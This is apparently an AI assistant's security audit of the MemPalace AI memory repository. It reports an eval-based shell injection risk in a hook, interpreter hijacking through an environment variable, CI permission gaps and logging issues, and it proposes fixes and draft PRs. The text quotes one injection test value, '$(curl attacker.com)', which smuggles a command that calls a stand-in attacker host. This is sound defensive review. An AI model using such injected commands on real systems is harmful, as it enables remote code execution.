Now I have all the information needed. Here is the full security audit report:

---

# Security Audit: MemPalace/mempalace

## Repository Overview

MemPalace is a local-first AI memory system that mines conversations and project files into a searchable "palace" structure (wings/rooms/drawers) backed by ChromaDB for vector search and SQLite for a knowledge graph. It exposes tools via an MCP server for Claude Code integration, a CLI, and plugin hooks for automated background ingestion. All data stays on the user's machine with no cloud dependencies for core operations.

- **Tech stack**: Python 3.9+, ChromaDB (vector DB), SQLite (knowledge graph), MCP protocol (JSON-RPC over stdio), shell hooks (bash)
- **Languages**: Python (~95%), Bash (~5%)
- **Frameworks**: hatchling build system, ruff linter, pytest
- **Maturity**: Growing (v3.3.0, 40+ modules, 85% coverage target, multi-platform CI)
- **Categories detected**: ai | actions

---

## Critical & High Severity Findings

### Finding 1: Shell `eval` on Sanitized-but-Fragile Input

- **Severity**: HIGH
- **Category**: injection
- **Location**: `hooks/mempal_save_hook.sh:87-100`
- **Description**: The hook reads JSON from stdin, pipes it through Python to extract fields, then uses `eval` to set shell variables. While the Python sanitizer strips non-alphanumeric characters (keeping `_/.-~`) and coerces booleans to strict strings, the use of `eval` on external output is inherently fragile. If the Python sanitizer fails silently (the `2>/dev/null` suppresses errors), or if a future change weakens the regex, arbitrary shell commands could execute. The sanitizer regex allows `/` in session IDs, which could create files in unexpected subdirectories.
- **Impact**: If an attacker controls the JSON input (e.g., via a malicious Claude Code harness or modified transcript), they could achieve arbitrary command execution in the user's shell context.
- **Fix**: Replace `eval` with explicit `read`-based parsing or `jq`-based extraction. Example:
  ```bash
  SESSION_ID=$("$MEMPAL_PYTHON_BIN" -c "import sys,json,re; d=json.load(sys.stdin); print(re.sub(r'[^a-zA-Z0-9_.\-]','',d.get('session_id','unknown')))" <<< "$INPUT")
  ```
  Also remove `/` from the safe character regex to prevent subdirectory creation.
- **Confidence**: medium (exploitation requires control of the hook's stdin, which is provided by the AI harness)

### Finding 2: `MEMPALACE_PYTHON` Environment Variable as Code Execution Vector

- **Severity**: HIGH
- **Category**: injection / arbitrary code execution
- **Location**: `mempalace/hooks_cli.py` (function `_mempalace_python()`), `hooks/mempal_save_hook.sh:76-79`
- **Description**: Both the Python hook dispatcher and the shell hooks resolve the Python interpreter from the `MEMPALACE_PYTHON` environment variable. While the Python code checks `os.path.isfile()` and `os.access(os.X_OK)`, it does not validate that the binary is actually a Python interpreter. An attacker who controls the environment can point this to any executable, achieving arbitrary code execution.
- **Impact**: Full code execution with the user's privileges. In shared environments or when hooks are triggered by automated systems, this is exploitable.
- **Fix**: Add validation that the resolved binary is actually Python (e.g., run `$MEMPAL_PYTHON --version` and verify the output contains "Python"). Document that this env var is a trusted input that must not be set from untrusted sources.
- **Confidence**: medium (requires environment control, which is plausible in CI/CD or shared systems)

---

## Medium & Low Severity Findings

### Finding 3: Missing Workflow Permissions

- **Severity**: MEDIUM
- **Category**: supply-chain / actions
- **Location**: `.github/workflows/ci.yml`, `.github/workflows/version-guard.yml`
- **Description**: Neither workflow declares explicit `permissions:` blocks. They inherit the repository's default token permissions, which may include `contents: write`, `issues: write`, `pull-requests: write`, etc. Following the principle of least privilege, CI workflows should explicitly declare `permissions: contents: read`.
- **Impact**: If a dependency or action is compromised, the workflow token has broader permissions than necessary, enabling potential supply chain attacks.
- **Fix**: Add `permissions: contents: read` at the top level of both workflow files.
- **Confidence**: high

### Finding 4: Unvalidated `palace_path` Accepts Arbitrary Filesystem Paths

- **Severity**: MEDIUM
- **Category**: path traversal
- **Location**: `mempalace/backends/chroma.py`, `mempalace/config.py:167-172`, `mempalace/mcp_server.py:94-95`
- **Description**: `palace_path` can be set via `--palace` CLI arg, `MEMPALACE_PALACE_PATH` env var, or config file. No validation ensures it points to a reasonable location. The path is used to create directories (`os.makedirs`), ChromaDB databases, and SQLite files. While this is expected for a local CLI tool, the MCP server exposes this path through its startup args.
- **Impact**: A malicious MCP config could create databases and directories at arbitrary filesystem locations.
- **Fix**: Validate that `palace_path` is under `~/.mempalace/` or a user-configured allowlist. At minimum, resolve symlinks and reject paths outside the user's home directory when running as MCP server.
- **Confidence**: low (MCP server args are typically configured by the user themselves)

### Finding 5: WAL Log Content Redaction is Incomplete

- **Severity**: LOW
- **Category**: information disclosure
- **Location**: `mempalace/mcp_server.py:134-136, 625-634`
- **Description**: The WAL (write-ahead log) redacts sensitive keys like `content` and `query`, but still logs `content_preview` (first 200 chars) in `add_drawer` and `delete_drawer` operations, and logs `content_length`. The redaction set includes `content_preview` as a key to redact, but the logged dict uses it as a separate key from `content`, so it gets redacted correctly. However, `tool_kg_add` logs `subject`, `predicate`, and `object` in cleartext, which may contain sensitive relationship data.
- **Impact**: Knowledge graph relationship data (e.g., "Alice married_to Bob") is logged in plaintext in the WAL file.
- **Fix**: Add KG entity names to the redaction set, or make WAL redaction configurable.
- **Confidence**: medium

### Finding 6: `deploy-docs.yml` Uses Pinned Bun Version

- **Severity**: LOW
- **Category**: supply-chain
- **Location**: `.github/workflows/deploy-docs.yml`
- **Description**: The docs deployment workflow uses `oven-sh/setup-bun@v2` with `bun-version: 1.1.38`. While version pinning is good, the action itself is not pinned to a commit SHA.
- **Impact**: If the `oven-sh/setup-bun` action is compromised at the v2 tag, it could inject malicious code into the docs build.
- **Fix**: Pin actions to commit SHAs instead of version tags.
- **Confidence**: low

### Finding 7: Broad Exception Handling Masks Errors

- **Severity**: LOW
- **Category**: logic / error handling
- **Location**: `mempalace/palace.py` (`file_already_mined` uses bare `except Exception`), `mempalace/mcp_server.py:232-233` (`_get_collection` swallows all exceptions)
- **Description**: Several functions catch `Exception` broadly and return default values, which can mask real errors (authentication failures, disk full, corruption) as "no palace found".
- **Impact**: Debugging difficulties. Silent data loss if writes fail but errors are swallowed.
- **Fix**: Narrow exception handling to expected exceptions (e.g., `FileNotFoundError`, `chromadb.errors.InvalidCollectionException`). Log unexpected exceptions.
- **Confidence**: high

---

## Supply Chain Analysis

### Dependencies (from `pyproject.toml`)

| Dependency | Version | Risk |
|---|---|---|
| `chromadb>=1.5.4,<2` | Core storage | **Low** - well-maintained, large user base. Pulls heavy transitive deps (onnxruntime, numpy). The project correctly mitigates ChromaDB's stdout pollution (issue #225). |
| `pyyaml>=6.0,<7` | Config parsing | **Low** - widely used. The codebase does not use `yaml.load()` unsafely (verified: no `yaml.load` without SafeLoader found). |
| `pytest>=7.0` (dev) | Testing | **None** - dev only |
| `ruff>=0.4.0` (dev) | Linting | **None** - dev only |
| `psutil>=5.9` (dev) | Process monitoring | **None** - dev only |
| `autocorrect>=2.0` (optional) | Spellcheck | **Low** - optional extra, not required for core |

**Positive**: Minimal dependency footprint (only 2 runtime deps). Dependabot is configured (`.github/dependabot.yml`). Pre-commit hooks configured.

**No known CVEs** in the pinned dependency ranges at time of review. The `chromadb>=1.5.4` lower bound is recent enough to avoid known issues.

---

## Code Quality Assessment

**Architecture**: Clean separation of concerns. MCP server, CLI, backends, searcher, miners are all distinct modules. Plugin architecture with entry points for backends and sources. The AAAK dialect is a novel compression approach for LLM-scannable indexes.

**Error handling**: Generally good with explicit error returns as dicts (MCP pattern). Some broad exception catching noted. WAL provides audit trail for writes.

**Input validation**: Strong. `sanitize_name()` blocks path traversal (`..`, `/`, `\`), null bytes, and enforces length limits. `sanitize_content()` enforces size limits. `sanitize_query()` mitigates prompt injection in search queries. `sanitize_kg_value()` is appropriately more permissive for natural-language KG values.

**Test coverage**: 85% threshold enforced in CI. Tests cover injection scenarios (e.g., `$(curl attacker.com)` in hook input). Multi-platform CI (Linux, Windows, macOS).

**Documentation**: Extensive CLAUDE.md with architecture, conventions, and contributing guidelines. RFC documents in `docs/rfcs/`. Hook documentation with installation guides.

---

## Contribution Opportunities

| Rank | File | Issue | Fix | Effort |
|---|---|---|---|---|
| 1 | `.github/workflows/ci.yml:1` | Missing `permissions: contents: read` | Add permissions block | trivial |
| 2 | `hooks/mempal_save_hook.sh:87` | `eval` on external output | Replace with direct variable assignment | small |
| 3 | `hooks/mempal_save_hook.sh:94` | `/` allowed in session ID sanitizer | Remove `/` from safe char regex | trivial |
| 4 | `mempalace/mcp_server.py:232-233` | `_get_collection` swallows all exceptions | Narrow to specific ChromaDB exceptions, log others | small |
| 5 | `.github/workflows/*.yml` | Actions not pinned to commit SHAs | Pin `actions/checkout`, `actions/setup-python`, etc. to SHA | small |

---

## Draft PRs

### PR 1: Harden shell hook against injection

- **PR Title**: `fix: replace eval with direct assignment in save hook`
- **Branch name**: `fix/hook-eval-injection`
- **Files to modify**: `hooks/mempal_save_hook.sh`
- **Changes**: Replace the `eval $(...)` pattern at line 87 with individual variable assignments using command substitution. Remove `/` from the safe character regex. Add a fallback for when Python parsing fails (currently silently passes through `eval` with empty string).
- **Impact**: Eliminates the highest-severity injection vector in the codebase.

### PR 2: Add explicit workflow permissions

- **PR Title**: `ci: add explicit permissions to GitHub Actions workflows`
- **Branch name**: `ci/workflow-permissions`
- **Files to modify**: `.github/workflows/ci.yml`, `.github/workflows/version-guard.yml`, `.github/workflows/deploy-docs.yml`
- **Changes**: Add `permissions: contents: read` to ci.yml and version-guard.yml. Add appropriate permissions for deploy-docs.yml (`contents: read`, `pages: write`, `id-token: write`). Pin all third-party actions to commit SHAs.
- **Impact**: Reduces blast radius of compromised actions/dependencies. Follows GitHub security best practices.

### PR 3: Validate MEMPALACE_PYTHON interpreter

- **PR Title**: `fix: validate MEMPALACE_PYTHON is a Python interpreter`
- **Branch name**: `fix/validate-python-interpreter`
- **Files to modify**: `mempalace/hooks_cli.py`, `hooks/mempal_save_hook.sh`
- **Changes**: After resolving the Python binary path, run `$binary --version` and verify output starts with "Python". Reject binaries that fail this check. Add a warning log when falling back from env var to PATH resolution.
- **Impact**: Prevents arbitrary code execution via crafted MEMPALACE_PYTHON environment variable.

---

## Scores (1-10)

| Category | Score |
|----------|-------|
| Code Quality | 8 |
| Security | 7 |
| Documentation | 9 |
| Test Coverage | 8 |
| Contribution Potential | 7 |

---

## Summary

- **Total findings by severity**: Critical: 0, High: 2, Medium: 2, Low: 3, Info: 0
- **Overall risk level**: **MEDIUM**
- **Top 3 recommendations**:
  1. **Replace `eval` in `hooks/mempal_save_hook.sh`** with direct variable assignments to eliminate shell injection risk
  2. **Add explicit `permissions:` blocks** to all GitHub Actions workflows to follow least-privilege principle
  3. **Validate `MEMPALACE_PYTHON`** environment variable resolves to an actual Python interpreter before executing it

The codebase demonstrates strong security awareness overall: parameterized SQL throughout, input sanitization at all entry points, no unsafe deserialization, no hardcoded secrets, restricted file permissions (0o700/0o600), WAL audit logging with content redaction, and explicit tests for injection attacks. The two high-severity findings are both in the shell/environment layer rather than the Python application code.
